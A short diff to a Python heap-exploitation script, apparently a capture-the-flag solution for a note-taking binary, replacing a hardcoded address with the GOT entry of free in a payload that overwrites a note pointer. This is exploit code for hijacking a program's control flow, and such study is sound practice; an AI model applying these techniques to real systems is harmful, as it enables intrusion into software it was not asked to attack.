@@ -200,7 +200,7 @@ if __name__ == "__main__":
 
     raw_input('after deleting note_1...')
 
-    edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(0x602018) + 'x'*(payload_len-32))
+    edit_note(0,payload_len, p64(1) + p64(1) + p64(8) + p64(b.got['free']) + 'x'*(payload_len-32))
 
     raw_input('after editing note_0->ptr to 0x602018...')
 
